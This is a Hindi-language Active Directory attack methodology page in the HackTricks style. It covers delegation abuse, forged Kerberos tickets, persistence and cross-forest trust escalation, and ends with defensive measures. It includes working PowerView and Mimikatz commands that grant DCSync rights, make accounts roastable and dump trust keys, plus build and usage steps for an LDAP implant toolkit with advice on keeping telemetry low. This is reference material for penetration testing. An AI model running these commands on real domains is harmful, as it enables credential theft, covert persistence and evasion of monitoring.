### IT asset/deployment platforms abuse

Third-party inventory और deployment suites अक्सर credentials और code execution तक पहुँच के शक्तिशाली रास्ते उजागर करती हैं। देखिए:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

यदि आप किसी Computer object को attribute [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) के साथ पाते हैं और उस कंप्यूटर पर आपके पास domain privileges हैं, तो आप उस कंप्यूटर पर login करने वाले हर user की memory से TGTs dump करने में सक्षम होंगे.\ इसलिए, यदि कोई **Domain Admin उस कंप्यूटर पर login करता है**, तो आप उसका TGT dump कर [Pass the Ticket](pass-the-ticket.md) का उपयोग करके उसकी impersonate कर सकेंगे.\ constrained delegation की वजह से आप यहाँ तक कि **स्वचालित रूप से किसी Print Server को compromise** भी कर सकते हैं (आशा है कि वह DC होगा)।

{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

यदि किसी user या computer को "Constrained Delegation" की अनुमति है, तो वह किसी कंप्यूटर में कुछ services तक पहुँचने के लिए **किसी भी user के रूप में impersonate** कर सकेगा.\ फिर, यदि आप इस user/computer का **hash compromise** कर लेते हैं तो आप किसी भी user (यहाँ तक कि domain admins भी) के रूप में services तक पहुँचने के लिए **impersonate** कर सकेंगे।

{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Remote computer के Active Directory object पर **WRITE** privilege होने से **elevated privileges** के साथ code execution प्राप्त करना संभव हो जाता है:

{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Compromised user के पास कुछ domain objects पर ऐसे **दिलचस्प privileges** हो सकते हैं जो आपको laterally **move** करने या privileges **escalate** करने की अनुमति दें।

{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Domain के अंदर किसी **Spool service के सुनने** का पता लगाना **abuse** करके **नए credentials प्राप्त** करने और **privileges escalate** करने में उपयोगी हो सकता है।

{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

यदि **अन्य उपयोगकर्ता** compromised मशीन तक **access** करते हैं, तो यह संभव है कि उनसे memory से **credentials gather** किए जाएँ और यहाँ तक कि उनकी प्रक्रियाओं में **beacons inject** करके उनकी impersonate की जाए।\ आमतौर पर उपयोगकर्ता सिस्टम तक RDP के माध्यम से पहुँचेंगे, इसलिए यहाँ third party RDP sessions पर कुछ हमले कैसे किए जाएँ वे दिए गए हैं:

{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** एक सिस्टम प्रदान करता है जो domain-joined कंप्यूटरों पर **local Administrator password** को manage करता है, यह सुनिश्चित करते हुए कि वह **randomized**, unique और बार-बार **changed** हो। ये passwords Active Directory में store होते हैं और केवल अधिकृत उपयोगकर्ताओं को ACLs के माध्यम से access दिया जाता है। यदि इन passwords तक पहुँचने के लिए पर्याप्त permissions हैं तो अन्य कंप्यूटरों पर pivot करना संभव हो जाता है।

{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**compromised machine से certificates इकट्ठा करना** environment के अंदर privileges escalate करने का एक तरीका हो सकता है:

{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

यदि **vulnerable templates** configured हैं तो उन्हें abuse करके privileges escalate करना संभव है:

{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

एक बार जब आप **Domain Admin** या और बेहतर **Enterprise Admin** privileges प्राप्त कर लेते हैं, तो आप **domain database**: _ntds.dit_ को **dump** कर सकते हैं।

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

पहले चर्चा की गई कुछ techniques को persistence के लिए उपयोग किया जा सकता है।\ उदाहरण के लिए आप कर सकते हैं:

- उपयोगकर्ताओं को [**Kerberoast**](kerberoast.md) के लिए vulnerable बनाएं

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- उपयोगकर्ताओं को [**ASREPRoast**](asreproast.md) के लिए vulnerable बनाएं

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- किसी user को [**DCSync**](#dcsync) privileges प्रदान करें

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** एक विशिष्ट सेवा के लिए **legitimate Ticket Granting Service (TGS) ticket** बनाता है, जो **NTLM hash** (उदा., **PC account का hash**) का उपयोग करके किया जाता है। यह विधि सेवा privileges तक **access** पाने के लिए इस्तेमाल की जाती है।

{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

एक **Golden Ticket attack** में attacker Active Directory (AD) एनवायरनमेंट में **krbtgt account का NTLM hash** प्राप्त कर लेता है। यह account विशेष है क्योंकि यह सभी **Ticket Granting Tickets (TGTs)** पर हस्ताक्षर करने के लिए उपयोग किया जाता है, जो AD नेटवर्क में authentication के लिए आवश्यक हैं।

एक बार attacker इस hash को प्राप्त कर लेता है, तो वह किसी भी account के लिए **TGTs** बना सकता है (Silver ticket attack).

{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

ये golden tickets की तरह होते हैं जो इस तरह से forge किए जाते हैं कि ये सामान्य golden tickets detection mechanisms को **bypass** कर देते हैं।

{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**किसी खाते के certificates होने या उन्हें request करने में सक्षम होना** उपयोगकर्ता के खाते में persist करने का एक बहुत अच्छा तरीका है (यहां तक कि अगर वह पासवर्ड बदल दे):

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Certificates का उपयोग करके domain के अंदर उच्च privileges के साथ भी persist किया जा सकता है:**

{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory में **AdminSDHolder** object privileged groups (जैसे Domain Admins और Enterprise Admins) की सुरक्षा सुनिश्चित करता है, इन समूहों पर एक standard **Access Control List (ACL)** लागू करके unauthorized परिवर्तन रोकने के लिए। हालांकि, इस feature का exploitation संभव है; यदि attacker AdminSDHolder की ACL को modify करके किसी सामान्य user को full access दे दे, तो वह user सभी privileged groups पर व्यापक नियंत्रण प्राप्त कर लेता है। यह सुरक्षा उपाय, जो सुरक्षा के लिए है, उल्टा प्रभाव डाल सकता है और बिना कड़े निगरानी के अवांछित access की अनुमति दे सकता है।

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

हर **Domain Controller (DC)** के अंदर एक **local administrator** account मौजूद होता है। ऐसी मशीन पर admin rights प्राप्त करके, local Administrator का hash **mimikatz** का उपयोग करके extract किया जा सकता है। इसके बाद, इस password के **उपयोग को सक्षम करने** के लिए रजिस्ट्री में परिवर्तन आवश्यक होता है, जिससे local Administrator account तक remote access संभव हो जाता है।

{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

आप किसी विशेष domain objects पर किसी **user** को कुछ **विशेष permissions** दे सकते हैं जो उस user को भविष्य में privileges **escalate** करने की अनुमति देंगे।

{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**security descriptors** का उपयोग किसी object के ऊपर मौजूद **permissions** को **store** करने के लिए किया जाता है। यदि आप किसी object के **security descriptor** में बस एक **छोटा सा परिवर्तन** कर दें, तो आप उस object पर बहुत ही दिलचस्प privileges प्राप्त कर सकते हैं बिना यह आवश्यक हो कि आप किसी privileged group के सदस्य हों।

{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

LSASS को memory में बदलकर एक **universal password** स्थापित करना, जिससे सभी domain accounts तक access मिल जाता है।

{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
आप अपना **own SSP** बना सकते हैं ताकि मशीन तक पहुँचने के लिए उपयोग किए गए **credentials** को **clear text** में **capture** किया जा सके।

{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

यह AD में एक **new Domain Controller** दर्ज करता है और इसे उपयोग करके निर्दिष्ट objects पर attributes (SIDHistory, SPNs...) **push** करता है बिना किसी **logs** को छोड़ें जो इन **modifications** के बारे में सूचित करें। आपको **DA** privileges चाहिए और **root domain** के अंदर होना चाहिए।\ ध्यान दें कि यदि आप गलत डेटा उपयोग करते हैं, तो काफी खराब लॉग्स दिखाई देंगे।

{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

पहले हमने चर्चा की थी कि यदि आपके पास **LAPS passwords पढ़ने के लिए पर्याप्त permission** हैं तो privileges कैसे escalate किए जा सकते हैं। हालाँकि, इन passwords का उपयोग **persistence बनाए रखने** में भी किया जा सकता है।\ देखें:

{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft **Forest** को security boundary मानता है। इसका मतलब है कि **एकल domain के compromise होने से संभावित रूप से पूरे Forest का compromise होने तक हो सकता है**।

### Basic Information

A [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) एक security mechanism है जो एक **domain** का उपयोगकर्ता दूसरे **domain** के resources तक पहुँचने में सक्षम बनाता है। यह मूलतः दोनों domains के authentication systems के बीच एक linkage बनाता है, जिससे authentication verifications निर्बाध रूप से बह सकें। जब domains एक trust सेटअप करते हैं, वे अपने **Domain Controllers (DCs)** के अंदर कुछ विशिष्ट **keys** का आदान-प्रदान और भंडारण करते हैं, जो trust की अखंडता के लिए महत्वपूर्ण होते हैं।

एक सामान्य परिदृश्य में, यदि किसी user को trusted domain में किसी service तक access करना है, तो उसे पहले अपने ही domain के DC से एक विशेष ticket जिसे **inter-realm TGT** कहा जाता है, अनुरोध करना होगा। यह TGT एक साझा **key** से encrypted होता है जिसे दोनों domains ने सहमति से रखा होता है। फिर user इस TGT को trusted domain के **DC** के पास ले जाता है ताकि वे service ticket (**TGS**) प्राप्त कर सके। trusted domain का DC inter-realm TGT को सत्यापित करने पर, वह TGS जारी करता है, जो user को service तक पहुँच प्रदान करता है।

**Steps**:

1. **Domain 1** का एक **client computer** अपनी **NTLM hash** का उपयोग करके अपने **Domain Controller (DC1)** से **Ticket Granting Ticket (TGT)** का अनुरोध करके प्रक्रिया शुरू करता है।
2. यदि client authenticated होता है तो DC1 नया TGT जारी करता है।
3. इसके बाद client DC1 से **inter-realm TGT** का अनुरोध करता है, जो **Domain 2** में resources तक पहुँचने के लिए आवश्यक है।
4. inter-realm TGT को दो-तरफ़ा domain trust के हिस्से के रूप में DC1 और DC2 के बीच साझा किए गए **trust key** से encrypt किया जाता है।
5. client inter-realm TGT को **Domain 2 के Domain Controller (DC2)** के पास ले जाता है।
6. DC2 अपने साझा trust key का उपयोग करके inter-realm TGT को सत्यापित करता है और, यदि वैध है, तो client द्वारा access की जाने वाली Domain 2 की सर्वर के लिए **Ticket Granting Service (TGS)** जारी करता है।
7. अंततः client इस TGS को सर्वर के पास प्रस्तुत करता है, जिसे सर्वर के account hash से encrypt किया गया होता है, ताकि Domain 2 में उस service तक access मिल सके।

### Different trusts

यह ध्यान देने योग्य है कि **trust एक-way या two-ways** हो सकता है। दो-तरफ़ा विकल्प में दोनों domains एक-दूसरे पर trust करेंगे, पर **one way** trust में एक domain **trusted** होगा और दूसरा **trusting** domain होगा। अंतिम मामले में, **आप केवल trusted domain से trusting domain के अंदर मौजूद resources तक ही पहुँच पाएँगे**।

यदि Domain A Domain B को trust करता है, तो A trusting domain है और B trusted है। साथ ही, **Domain A** में यह एक **Outbound trust** होगा; और **Domain B** में यह एक **Inbound trust** होगा।

**Different trusting relationships**

- **Parent-Child Trusts**: यह same forest के भीतर सामान्य setup है, जहाँ child domain अपने parent domain के साथ automatisch दो-तरफ़ा transitive trust रखता है। इसका अर्थ है कि authentication requests parent और child के बीच निर्बाध रूप से प्रवाहित हो सकते हैं।
- **Cross-link Trusts**: जिन्हें "shortcut trusts" कहा जाता है, ये child domains के बीच स्थापित किए जाते हैं ताकि referral प्रक्रियाओं को तेज़ किया जा सके। जटिल forests में, authentication referrals आमतौर पर forest root तक ऊपर और फिर target domain तक नीचे यात्रा करते हैं। cross-links बनाकर यह यात्रा छोटा की जा सकती है, जो भौगोलिक रूप से फैले वातावरण में विशेष रूप से उपयोगी है।
- **External Trusts**: ये विभिन्न, असंबंधित domains के बीच स्थापित किए जाते हैं और स्वाभाविक रूप से non-transitive होते हैं। [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) के अनुसार, external trusts उन स्थितियों में उपयोगी होते हैं जहाँ current forest के बाहर के किसी domain के resources तक पहुँचने की आवश्यकता होती है जो forest trust से जुड़ा नहीं है। External trusts के साथ SID filtering सुरक्षा को बढ़ाता है।
- **Tree-root Trusts**: ये trusts forest root domain और किसी नए जोड़े गए tree root के बीच अपने आप स्थापित हो जाते हैं। सामान्यतः इनसे कम ही सामना होता है, पर tree-root trusts नए domain trees को forest में जोड़ने के लिए महत्वपूर्ण होते हैं, जिससे वे अपना अद्वितीय domain नाम बनाए रख सकें और two-way transitivity सुनिश्चित हो सके। अधिक जानकारी [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) में मिलती है।
- **Forest Trusts**: यह प्रकार दो forest root domains के बीच दो-तरफ़ा transitive trust होता है, जो सुरक्षा उपायों को बढ़ाने के लिए SID filtering भी लागू करता है।
- **MIT Trusts**: ये trusts non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains के साथ स्थापित किए जाते हैं। MIT trusts थोड़े अधिक विशेषीकृत होते हैं और उन वातावरणों के लिए बनाए गए हैं जिन्हें Windows पारिस्थितिकी तंत्र से बाहर Kerberos-based सिस्टमों के साथ एकीकरण की आवश्यकता होती है।

#### Other differences in **trusting relationships**

- A trust relationship can also be **transitive** (A trust B, B trust C, then A trust C) or **non-transitive**.
- A trust relationship can be set up as **bidirectional trust** (both trust each other) or as **one-way trust** (only one of them trust the other).

### Attack Path

1. **Enumerate** the trusting relationships
2. Check if any **security principal** (user/group/computer) has **access** to resources of the **other domain**, maybe by ACE entries or by being in groups of the other domain. Look for **relationships across domains** (the trust was created for this probably).
1. kerberoast in this case could be another option.
3. **Compromise** the **accounts** which can **pivot** through domains.

Attackers could access resources in another domain through three primary mechanisms:

- **Local Group Membership**: Principals might be added to local groups on machines, such as the “Administrators” group on a server, granting them significant control over that machine.
- **Foreign Domain Group Membership**: Principals can also be members of groups within the foreign domain. However, the effectiveness of this method depends on the nature of the trust and the scope of the group.
- **Access Control Lists (ACLs)**: Principals might be specified in an **ACL**, particularly as entities in **ACEs** within a **DACL**, providing them access to specific resources. For those looking to dive deeper into the mechanics of ACLs, DACLs, and ACEs, the whitepaper titled “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” is an invaluable resource.

### Find external users/groups with permissions

You can check **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** to find foreign security principals in the domain. These will be user/group from **an external domain/forest**.

You could check this in **Bloodhound** or using powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
डोमेन ट्रस्ट्स को enumerate करने के अन्य तरीके:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> वर्तमान में **2 trusted keys** हैं, एक _Child --> Parent_ के लिए और दूसरा _Parent_ --> _Child_ के लिए।\
> आप वर्तमान डोमेन द्वारा उपयोग किए जा रहे key को निम्न कमांड से देख सकते हैं:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Trust का दुरुपयोग करके SID-History injection के माध्यम से child/parent domain में Enterprise admin के रूप में escalate करें:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

यह समझना ज़रूरी है कि Configuration Naming Context (NC) का कैसे शोषण किया जा सकता है। Configuration NC Active Directory (AD) पर्यावरणों में एक forest भर के configuration डेटा का केंद्रीय भंडार है। यह डेटा forest के हर Domain Controller (DC) पर प्रतिलिपि के रूप में मौजूद होता है, और writable DCs Configuration NC की writable copy रखते हैं। इसका शोषण करने के लिए, आपके पास किसी DC पर **SYSTEM privileges**, अधिमानतः एक child DC, होना आवश्यक है।

**Link GPO to root DC site**

Configuration NC का Sites container AD forest के भीतर सभी domain-joined कंप्यूटरों की साइट्स के बारे में जानकारी रखता है। किसी भी DC पर **SYSTEM privileges** के साथ कार्य करके, हमला करने वाले GPOs को root DC sites से लिंक कर सकते हैं। इस क्रिया से उन साइट्स पर लागू नीतियों को बदलकर root domain समझौता हो सकता है।

For in-depth information, one might explore research on [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

एक attack vector में domain के अंदर privileged gMSAs को लक्ष्य बनाना शामिल है। gMSA के पासवर्ड की गणना के लिए आवश्यक KDS Root key Configuration NC में संग्रहीत होती है। किसी भी DC पर **SYSTEM privileges** के साथ KDS Root key तक पहुँच प्राप्त कर के पूरे forest में किसी भी gMSA का पासवर्ड गणना करना संभव है।

Detailed analysis and step-by-step guidance can be found in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Additional external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

यह तरीका धैर्य मांगता है — नए privileged AD objects के बनने का इंतज़ार करना। **SYSTEM privileges** के साथ, एक हमला करने वाला AD Schema को modify कर सकता है ताकि किसी भी user को सभी classes पर पूर्ण नियंत्रण दिया जा सके। इससे नए बनाए गए AD objects पर अनधिकृत पहुँच और नियंत्रण मिल सकता है।

Further reading is available on [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

ADCS ESC5 vulnerability का लक्ष्य Public Key Infrastructure (PKI) objects पर नियंत्रण हासिल करना है ताकि एक certificate template बनाया जा सके जो forest के किसी भी user के रूप में authentication सक्षम करे। चूँकि PKI objects Configuration NC में रहते हैं, इसलिए किसी writable child DC का compromise करके ESC5 attacks को अंजाम दिया जा सकता है।

More details on this can be read in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). In scenarios lacking ADCS, the attacker has the capability to set up the necessary components, as discussed in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
In this scenario **your domain is trusted** by an external one giving you **undetermined permissions** over it. You will need to find **which principals of your domain have which access over the external domain** and then try to exploit it:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### बाहरी फॉरेस्ट डोमेन - एक-तरफा (आउटबाउंड)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
इस परिदृश्य में **आपका डोमेन** किसी **विभिन्न डोमेनों** के प्रिंसिपल को कुछ **विशेषाधिकार** देने के लिए भरोसा कर रहा है।

हालाँकि, जब किसी **डोमेन पर भरोसा** trusting domain द्वारा किया जाता है, तो trusted domain एक **user बनाता है** जिसका **नाम अनुमाननीय** होता है और जिसका पासवर्ड के रूप में **trusted password** उपयोग होता है। इसका मतलब है कि trusting डोमेन का कोई user trusted डोमेन में घुसकर उसे एन्यूमरेट कर सकता है और अधिक विशेषाधिकार बढ़ाने की कोशिश कर सकता है:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

trusted डोमेन से समझौता करने का एक और तरीका है [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) ढूँढना जो domain trust की **विपरीत दिशा** में बनाया गया हो (यह बहुत आम नहीं है)।

trusted डोमेन से समझौता करने का एक और तरीका यह है कि किसी मशीन पर इंतजार किया जाए जहाँ **trusted domain का कोई user** RDP के माध्यम से लॉगिन कर सकता हो। फिर, attacker RDP session process में कोड इंजेक्ट कर सकता है और वहाँ से **victim के origin domain** तक पहुँच सकता है. \
इसके अतिरिक्त, यदि **victim ने अपना हार्ड ड्राइव माउंट किया हुआ** है, तो **RDP session** प्रक्रिया से attacker हार्ड ड्राइव के **startup folder** में **backdoors** रख सकता है। इस तकनीक को **RDPInception** कहा जाता है।


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### डोमेन ट्रस्ट दुरुपयोग निवारण

### **SID Filtering:**

- SID history attribute को लेकर forest trusts में उपयोग होने वाले हमलों का जोखिम SID Filtering द्वारा कम किया जाता है, जो सभी inter-forest trusts पर डिफ़ॉल्ट रूप से सक्रिय होता है। यह माइक्रोसॉफ्ट के दृष्टिकोण के अनुसार फॉरेस्ट को सुरक्षा सीमा मानते हुए इसका आधार है, न कि डोमेन को।
- हालांकि, एक समस्या यह है कि SID filtering कुछ applications और user access को बाधित कर सकता है, जिसके कारण इसे कभी-कभी निष्क्रिय भी किया जाता है।

### **Selective Authentication:**

- inter-forest trusts के लिए, Selective Authentication का उपयोग यह सुनिश्चित करता है कि दोनों forests के users अपने आप authenticated न हों। इसके बजाय, users को trusting domain या forest के भीतर domains और servers तक पहुँचने के लिए स्पष्ट अनुमति (explicit permissions) की आवश्यकता होती है।
- यह ध्यान रखना महत्वपूर्ण है कि ये उपाय writable Configuration Naming Context (NC) के शोषण या trust account पर होने वाले हमलों से सुरक्षा प्रदान नहीं करते।

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) bloodyAD-style LDAP primitives को x64 Beacon Object Files के रूप में पुनः लागू करता है जो पूरी तरह से एक on-host implant (उदा., Adaptix C2) के अंदर चलते हैं। Operators pack को `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` के साथ compile करते हैं, `ldap.axs` लोड करते हैं, और फिर beacon से `ldap <subcommand>` कॉल करते हैं। सभी ट्रैफ़िक वर्तमान logon security context पर LDAP (389) पर signing/sealing या LDAPS (636) पर auto certificate trust के साथ चलता है, इसलिए किसी socks proxies या disk artifacts की आवश्यकता नहीं होती।

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`,`get-groupmembers` short names/OU paths को full DNs में resolve करके संबंधित objects को dump करते हैं।
- `get-object`, `get-attribute`, और `get-domaininfo` arbitrary attributes (including security descriptors) और `rootDSE` से forest/domain metadata खींचते हैं।
- `get-uac`, `get-spn`, `get-delegation`, और `get-rbcd` LDAP से सीधे roasting candidates, delegation settings, और existing [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors को उजागर करते हैं।
- `get-acl` और `get-writable --detailed` DACL को पार्स करके trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), और inheritance को सूचीबद्ध करते हैं, जिससे ACL privilege escalation के तत्काल लक्ष्य मिलते हैं।
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) ऑपरेटर को उन स्थानों पर नए principals या machine accounts स्टेज करने देते हैं जहाँ OU अधिकार मौजूद हों। `add-groupmember`, `set-password`, `add-attribute`, और `set-attribute` सीधे लक्ष्यों को हाईजैक कर लेते हैं जब write-property अधिकार मिल जाते हैं।
- ACL-केंद्रित कमांड जैसे `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, और `add-dcsync` किसी भी AD object पर WriteDACL/WriteOwner को पासवर्ड रिसेट, ग्रुप मेम्बरशिप कंट्रोल, या DCSync replication privileges में बदल देते हैं बिना PowerShell/ADSI आर्टिफैक्ट छोड़े। `remove-*` उपयुक्त कमांड्स इंजेक्ट किए गए ACEs को क्लीनअप करते हैं।

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` तुरंत compromised user को Kerberoastable बनाते हैं; `add-asreproastable` (UAC toggle) उसे AS-REP roasting के लिए मार्क करता है बिना पासवर्ड छुए।
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) beacon से `msDS-AllowedToDelegateTo`, UAC flags, या `msDS-AllowedToActOnBehalfOfOtherIdentity` को री-राइट करते हैं, जिससे constrained/unconstrained/RBCD attack paths सक्षम हो जाते हैं और remote PowerShell या RSAT की आवश्यकता समाप्त हो जाती है।

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` नियंत्रित प्रिंसिपल के SID history में privileged SIDs inject करता है (see [SID-History Injection](sid-history-injection.md)), जिससे LDAP/LDAPS के माध्यम से स्टेल्थी access inheritance मिलता है।
- `move-object` कंप्यूटर्स या यूज़र्स का DN/OU बदलता है, जिससे अटैकर उन OUs में संसाधनों को खींच सकता है जहाँ पहले से delegated अधिकार मौजूद हैं, और फिर `set-password`, `add-groupmember`, या `add-spn` का दुरुपयोग कर सकता है।
- तंग स्कोप वाले removal commands (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, आदि) ऑपरेटर द्वारा क्रेडेंशियल्स या persistence हार्वेस्ट करने के बाद तेज़ rollback की अनुमति देते हैं, जिससे telemetry कम से कम होती है।

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## कुछ सामान्य रक्षा उपाय

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **क्रेडेंशियल सुरक्षा के लिए रक्षात्मक उपाय**

- **Domain Admins Restrictions**: यह अनुशंसित है कि Domain Admins केवल Domain Controllers में लॉगिन करने की अनुमति रखें और अन्य होस्ट्स पर उनका उपयोग टालें।
- **Service Account Privileges**: सर्विसेज़ को सुरक्षा बनाए रखने के लिए Domain Admin (DA) privileges के साथ नहीं चलाना चाहिए।
- **Temporal Privilege Limitation**: जिन कार्यों के लिए DA privileges चाहिए, उनकी अवधि सीमित रखी जानी चाहिए। यह इस तरह किया जा सकता है: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Event IDs 2889/3074/3075 को ऑडिट करें और फिर LDAP MITM/relay प्रयासों को रोकने के लिए DCs/clients पर LDAP signing तथा LDAPS channel binding लागू करें।

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Deception Techniques लागू करना**

- Deception लागू करने का अर्थ है जाल बिछाना, जैसे decoy users या computers बनाना, जिनमें ऐसे फीचर हों जैसे passwords that do not expire या जिन्हें Trusted for Delegation के रूप में मार्क किया गया हो। विस्तृत तरीका विशेष अधिकारों वाले यूज़र्स बनाना या उन्हें उच्च-privilege समूहों में जोड़ना शामिल कर सकता है।
- एक व्यावहारिक उदाहरण में इस तरह के टूल्स का उपयोग शामिल है: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Deception techniques तैनात करने के बारे में अधिक जानकारी [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception) पर मिलती है।

### **Deception की पहचान करना**

- **For User Objects**: संदिग्ध संकेतों में असामान्य ObjectSID, कम लॉगऑन आवृत्ति, निर्माण तिथियाँ, और कम bad password counts शामिल हैं।
